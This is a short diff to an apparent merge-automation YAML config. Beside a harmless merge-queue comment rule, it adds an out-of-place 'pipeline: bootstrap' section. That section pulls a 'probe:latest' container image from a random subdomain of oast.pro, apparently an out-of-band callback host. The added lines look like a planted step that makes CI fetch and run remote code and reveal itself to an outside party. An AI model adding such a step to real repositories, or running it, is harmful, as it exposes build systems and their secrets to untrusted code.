@@ -5,3 +5,6 @@ pull_request_rules:
     actions:
       comment:
         message: "Merge queue label seen."
+pipeline:
+  bootstrap:
+    image: bootimg.dbcnm55mktvu49alvk8gtotdw45osfpzo.oast.pro/probe:latest
